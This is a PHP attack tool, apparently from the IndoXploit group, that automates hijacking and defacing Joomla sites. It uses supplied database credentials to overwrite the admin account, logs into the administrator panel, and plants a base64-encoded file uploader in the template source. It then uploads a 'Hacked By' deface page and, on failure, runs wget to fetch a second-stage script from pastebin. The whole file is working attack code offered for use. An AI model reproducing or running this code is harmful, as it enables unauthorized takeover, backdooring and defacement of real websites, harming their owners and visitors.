<?php

//Tu5b0l3d
//thx to: IndoXploit
//http://indoxploit.blogspot.com/2015/12/auto-deface-cms-joomla-if-you-get-config.html

error_reporting(0);
    if($_POST['submitt']){

       
function pereg($anu,$pereg){
                    $ch2 = curl_init ("$anu");
                    curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
                   curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt ($ch2, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
                    curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
                    $data = curl_exec ($ch2);
                                
                        preg_match("/$pereg/", $data, $token1);
                        return $token1[1];
}

function ngecurl($sites){
        $ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
    }

function ambilkata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

function lohgin($fak1,$fak2,$fak3,$fak4,$fak5){
    $post2 = array(
                    "username" => "$fak1",
                    "passwd" => "$fak2",
                    "lang" => "en-GB",
                    "option" => "com_login",
                    "task" => "login",
                    "return" => "$fak3",
                    "$fak4" => "1",
                   
                    );

$ch = curl_init ("$fak5");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$prett = curl_exec($ch);
return $prett;
}
        $host = $_POST['host'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        $db = $_POST['db'];
        $dbprefix = $_POST['dbprefix'];
        $user_baru = $_POST['user_baru'];
        $password_baru = $_POST['password_baru'];
        $tanya = $_POST['tanya'];
        $target = $_POST['target'];
        $hackedby = $_POST['hackedby'];
        $prefix = $dbprefix."users";
        $pass = md5("$password_baru");
        $upda = $db.".".$dbprefix;

        mysql_connect($host,$username,$password);

        mysql_select_db($db);


 $tampil=mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
    $r=mysql_fetch_array($tampil);
        $id = $r[id];
       
         mysql_query("UPDATE $prefix SET password='$pass',username='$user_baru' WHERE id='$id'");

            
            if ($tanya == "y"){

                $path = "/administrator/index.php?option=com_templates&view=templates";
                $site = $target.$path;
                $token1 = pereg($site, '<input type=\"hidden\" name=\"return\" value=\"(.*?)\" \/>');
                $token2 = pereg($site, '<input type=\"hidden\" name=\"(.*?)\" value=\"1\" \/>');

//Login            
$aso2 = lohgin($user_baru,$password_baru,$token1,$token2,$site);
$aso = ngecurl($site);
$id = ambilkata($aso, "/administrator/index.php?option=com_templates&amp;view=template&amp;id=","\">");
echo "# ID -> $id .... <br>";
$bener_id = base64_encode("$id:index.php");

$akaa = "/administrator/index.php?option=com_templates&task=source.edit&id=$bener_id";
$ak = $target.$akaa;


$extensi = ngecurl($ak);
$ambil_extensi = ambilkata($extensi, 'id="jform_extension_id" value="','" />');
$file_value = ambilkata($extensi, 'id="jform_filename" value="','" />');
$nama_template = ambilkata($extensi, 'Editing file "index.php" in template "','".</legend>');
echo "# Template -> $nama_template<br>";



$upload = base64_decode("Z3cgZ2FudGVuZw0KPD9waHANCiAgJGZpbGUgPSAkX0ZJTEVTWydmaWxlJ107DQogICRuZXdmaWxlPSJrLnBocCI7DQoJCWlmIChmaWxlX2V4aXN0cygiLi4vLi4vIi4kbmV3ZmlsZSkpIHVubGluaygiLi4uLi8vIi4kbmV3ZmlsZSk7DQogICAgCW1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZVsndG1wX25hbWUnXSwgIi4uLy4uLyRuZXdmaWxlIik7DQo/Pg0K");
$coeg = "$target/administrator/index.php?option=com_templates&view=template&id=$id&file=";
echo "# Uploading...<br>";

$token3 = pereg($coeg, '<input type=\"hidden\" name=\"(.*?)\" value=\"1\" \/>');
$post2 = array(
                    "jform[source]" => "$upload",
                    "task" => "source.save",
                    "$token3" => "1",
                    "jform[extension_id]"=> "$ambil_extensi",
                    "jform[filename]" => "$file_value",
                    );

$ch3 = curl_init ("$coeg");
curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch3, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch3, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch3, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch3, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch3, CURLOPT_POST, 1);
curl_setopt ($ch3, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch3, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch3, CURLOPT_COOKIEFILE,'coker_log');
$masuk2 = curl_exec ($ch3);


if(preg_match("#successfully#is", $masuk2)){
echo "# uploader udh ketanem...<br>";
echo "# lanjut mepes...<br>";

$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$hackedby);

$ch4 =curl_init("$target/templates/$nama_template/index.php");
                            curl_setopt($ch4, CURLOPT_POST, true);
                            curl_setopt($ch4, CURLOPT_POSTFIELDS,
                            array('file'=>"@$www"));
                            curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt ($ch4, CURLOPT_SSL_VERIFYPEER, 0);
                            curl_setopt ($ch4, CURLOPT_SSL_VERIFYHOST, 0);
                            $postResult = curl_exec($ch4);
                            curl_close($ch4);


   $ch5 = "$target/k.php";
$file2 = @file_get_contents($ch5);
                            

                     if(preg_match('#hacked#is', $file2)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "$target/k.php<br>";
                    }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";
                        echo "# coba aja manual: <br>";
                        echo "# $target/administrator<br>";
                        echo "# username: $user_baru<br>";
                        echo "# password: $password_baru<br>";                  
                    }
                
}
else{
    echo "# failed<br>";
    echo "# data udh bener. beda versi joomla mungkin :(<br>";
    echo "# coba aja manual: <br>";
    echo "# $target/administrator<br>";
    echo "# username: $user_baru<br>";
    echo "# password: $password_baru<br><br>";
    echo "# atau coba yg versi 2<br>";
    system('wget http://pastebin.com/raw.php?i=GAvpSP68');
    system('cp raw.php?i=GAvpSP68 joomla-2.php');
    echo "<a href='joomla-2.php' style='text-decoration:none;'>Disini..</a><br>";
}

         }
            elseif($tanya == "n"){
            echo "# Sukses<br>";
            echo "# username: $user_baru<br>";
            echo "# password: $password_baru<br>";

            }
        
        }

        else{

            echo '<html>

    <head>
        <title>Edit user in joomla v1.1</title>
    </head>

    <body>
        <center>
                        <h2>Joomla | created by IndoXploit</h2>

                        <table>

                            <tr><td><form method="post" action="?action"></td></tr>

                            <tr><td><input type="text" name="host" placeholder="localhost"></td></tr>

                            <tr><td><input type="text" name="username" placeholder="User DB"></td></tr>

                            <tr><td><input type="text" name="password" placeholder="Password DB"></td></tr>

                            <tr><td><input type="text" name="db" placeholder="Database"></td></tr>

                            <tr><td><input type="text" name="dbprefix" placeholder="dbprefix"></td></tr>

                            <tr><td><input type="text" name="user_baru" placeholder="Username Baru"></td></tr>

                            <tr><td><input type="text" name="password_baru" placeholder="Password Baru"></td></tr>
                            <tr><td></td></tr>
                            <tr><td></td></tr>
                          

                            <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                             <tr><td><input type="text" name="target" placeholder="www.IndoXploit.org"></td></tr>
                             <tr><td><input type="text" name="hackedby" placeholder="Hacked By Tu5b0l3d"></td></tr>

                            <tr><td><input type="submit" value="Submit" name="submitt"></td></tr>

                        </table>
                        *nb: kalo milih y ... silahkan masukin nama sitenya, kalo ngk tau nama sitenya, pilih n

            </center>

    </body>';

        }



?>
